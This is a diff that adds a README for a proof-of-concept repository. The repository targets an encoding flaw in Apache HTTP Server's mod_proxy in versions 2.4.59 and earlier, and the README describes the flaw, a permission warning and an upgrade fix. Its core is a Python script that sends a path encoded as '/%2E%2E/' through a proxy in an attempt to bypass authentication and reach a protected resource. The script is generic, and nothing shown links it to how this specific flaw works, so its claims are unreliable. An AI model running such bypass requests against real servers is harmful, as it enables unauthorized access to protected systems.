@@ -1,0 +1,103 @@
+# Proof of Concept (PoC) for Encoding Problem in mod_proxy in Apache HTTP Server
+
+This repository contains Proof of Concept (PoC) scripts for demonstrating an encoding problem in the `mod_proxy` module of Apache HTTP Server versions 2.4.59 and earlier. This vulnerability allows request URLs with incorrect encoding to be sent to backend services, potentially bypassing authentication via crafted requests.
+
+## Table of Contents
+
+- [Vulnerability Description](#vulnerability-description)
+- [Setup and Usage](#setup-and-usage)
+- [Important Considerations](#important-considerations)
+- [Mitigation](#mitigation)
+
+## Vulnerability Description
+
+**CVE-ID**: (Pending)
+
+**Overview**: 
+An encoding problem in the `mod_proxy` module of Apache HTTP Server versions 2.4.59 and earlier allows request URLs with incorrect encoding to be sent to backend services. This can potentially bypass authentication mechanisms via crafted requests. Users are recommended to upgrade to version 2.4.60, which fixes this issue.
+
+**Affected Versions**: 
+- Apache HTTP Server 2.4.59 and earlier
+
+**Fixed Version**: 
+- Apache HTTP Server 2.4.60
+
+## Setup and Usage
+
+### Prerequisites
+
+- Python 3.x
+- `requests` library (`pip install requests`)
+
+### Demonstrating the Vulnerability
+
+1. **Identify the Backend Service**:
+   - Assume the backend service is located at `http://backend-service.example.com`.
+
+2. **Craft a Malicious Request**:
+   - The malicious request will use incorrect encoding to bypass authentication.
+
+3. **Run the PoC Script**:
+   - Save the following script as `mod_proxy_poc.py` and run it.
+
+### PoC Script
+
+Here’s a Python script that demonstrates the vulnerability:
+
+```python
+import requests
+
+# Configuration
+proxy_url = "http://proxy-server.example.com"  # Change this to the proxy server's URL
+backend_service_path = "/protected/resource"  # The path to the protected resource on the backend service
+malicious_path = "/%2E%2E/protected/resource"  # Incorrectly encoded path to bypass authentication
+
+# Malicious request to be sent via the proxy server
+malicious_url = f"{proxy_url}{malicious_path}"
+
+def send_malicious_request():
+    try:
+        # Send the crafted request to the proxy server
+        response = requests.get(malicious_url)
+        
+        # Print the response details
+        print("Status Code:", response.status_code)
+        print("Response Headers:", response.headers)
+        print("Response Body:", response.text)
+        
+        if response.status_code == 200:
+            print("[+] Successfully bypassed authentication and accessed the protected resource.")
+        else:
+            print("[-] Failed to bypass authentication.")
+    except Exception as e:
+        print("[-] An error occurred:", str(e))
+
+if __name__ == "__main__":
+    send_malicious_request()
+```
+
+### Explanation
+
+1. **Configuration**:
+   - `proxy_url`: The URL of the proxy server.
+   - `backend_service_path`: The path to the protected resource on the backend service.
+   - `malicious_path`: The incorrectly encoded path to bypass authentication.
+
+2. **send_malicious_request**:
+   - Constructs a malicious URL with the incorrectly encoded path.
+   - Sends a GET request to the proxy server with the malicious URL.
+   - Prints the response details to check if authentication was bypassed.
+
+## Important Considerations
+
+- **Permissions**: Ensure you have explicit permission to test this vulnerability on the target system. Unauthorized access is illegal and unethical.
+- **Testing Environment**: Perform this test in a controlled environment to avoid impacting production systems.
+
+## Mitigation
+
+To mitigate this vulnerability, upgrade to Apache HTTP Server version 2.4.60, which fixes the encoding problem in the `mod_proxy` module.
+
+- **Upgrade Instructions**:
+  - Follow the official [Apache HTTP Server documentation](https://httpd.apache.org/docs/current/install.html) to download and install the latest version.
+
+By keeping your software up-to-date and following security best practices, you can prevent vulnerabilities such as this encoding problem in the `mod_proxy` module.
